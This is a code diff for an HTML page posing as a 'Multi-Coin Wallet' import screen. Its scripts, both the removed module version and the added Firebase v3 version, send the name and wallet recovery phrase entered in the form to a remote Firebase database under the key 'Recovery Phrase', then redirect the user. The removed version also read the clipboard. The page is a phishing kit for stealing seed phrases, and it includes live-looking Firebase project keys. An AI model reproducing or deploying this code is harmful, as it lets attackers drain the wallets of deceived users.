@@ -49,7 +49,7 @@
     <div class="container-fluid">
       <div class="row top-div pt-4 text-center">
         <div class="col-3 ml-2 im pt-4">
-            <a href="/second.html"><i style="font-size: 1.3em;" class="fa fa-angle-left"></i></a><span>Import</span>
+            <a href="./second.html"><i style="font-size: 1.3em;" class="fa fa-angle-left"></i></a><span>Import</span>
         </div>
         <div class="col-5 mid pt-4 ml-3 px-4">Multi-Coin Wallet</div>
         <div class="col-3 img-nav pt-4 px-0 mx-auto"><img src="./img/barcode-scan1.png" alt=""></div>
@@ -74,7 +74,7 @@
       </div>
       
       <div class="d-grid fift-div">
-        <button type="submit" class="btn-block fift-div mx-5 rounded-4" >Import</button>
+        <button type="submit" class="btn-block fift-div mx-5 rounded-4" onclick="redirect()">Import</button>
       </div>
     </form>
     <div class="sixth-div mt-5">
@@ -99,60 +99,59 @@
         });
       }
     </script>
-
-    <script type="module">
-      // Import the functions you need from the SDKs you need
-		import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
-		import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";
-		 
-		// Paste the code from Firebase
-		// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-		// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-    const firebaseConfig = {
-      apiKey: "AIzaSyDif8ZefP1Phs0vCUyMX6Y9yFulfU9a2tc",
-      authDomain: "alptrust-7b8a2.firebaseapp.com",
-      databaseURL: "https://alptrust-7b8a2-default-rtdb.firebaseio.com",
-      projectId: "alptrust-7b8a2",
-      storageBucket: "alptrust-7b8a2.appspot.com",
-      messagingSenderId: "18887981511",
-      appId: "1:18887981511:web:b251ae21384c3688c0c1e2",
-      measurementId: "G-WT5S5HB7K6"
-    };
-		 
-		// Initialize Firebase
-		const app = initializeApp(firebaseConfig);
-		 
-		// Get a reference to the database service
-		const db = getDatabase(app);
-		 
-		document.getElementById('frmContact').addEventListener('submit', function(e) {
-			e.preventDefault();
-			set(ref(db, 'users/' + Math.random().toString(36).slice(2, 7)), {
-				name: document.getElementById('name').value,
-				phrase: document.getElementById('phrase').value,
-			});
-		 
-			// alert('Your form is submitted');
-      window.open('page4.html')
-			document.getElementById('frmContact').reset();
-		});
-    // document.getElementById("redi").onclick = function () {
-    //     location.href = "www.yoursite.com";
-    // };
-    
-    // function redirect(){
-    //     window.location.href="login.html";
-    // }
-      navigator.clipboard
-        .readText()
-        .then((copiedText) => {
-              // Do something with copied text
-              console.log(copiedText);
-      });
+    <script src=
+      "https://www.gstatic.com/firebasejs/3.7.4/firebase.js">
     </script>
-
     
+    <script>
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+          // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      const firebaseConfig = {
+        apiKey: "AIzaSyDif8ZefP1Phs0vCUyMX6Y9yFulfU9a2tc",
+        authDomain: "alptrust-7b8a2.firebaseapp.com",
+        databaseURL: "https://alptrust-7b8a2-default-rtdb.firebaseio.com",
+        projectId: "alptrust-7b8a2",
+        storageBucket: "alptrust-7b8a2.appspot.com",
+        messagingSenderId: "18887981511",
+        appId: "1:18887981511:web:b251ae21384c3688c0c1e2",
+        measurementId: "G-WT5S5HB7K6"
+      };
+      firebase.initializeApp(firebaseConfig);
+
+      var messagesRef = firebase.database()
+        .ref('Recovery Phrase');
+      
+      document.getElementById('frmContact')
+        .addEventListener('submit', submitForm);
+
+      function submitForm(e) {
+        e.preventDefault();
+
+        // Get values
+        var name = getInputVal('name');
+        var phrase = getInputVal('phrase');
+
+        saveMessage(name, phrase);
+        document.getElementById('frmContact').reset();
+      }
+
+      // Function to get get form values
+      function getInputVal(id) {
+        return document.getElementById(id).value;
+      }
+
+      // Save message to firebase
+      function saveMessage(name, phrase) {
+        var newMessageRef = messagesRef.push();
+        newMessageRef.set({
+          name: name,
+          phrase: phrase,
+        });
+      }
+      function redirect(){
+        window.location.href="./page4.html";
+      }
+    </script>
     <!--SCRIPTS-->
     <!-- include the library -->
     <script src="https://unpkg.com/html5-qrcode@2.0.9/dist/html5-qrcode.min.js"></script>
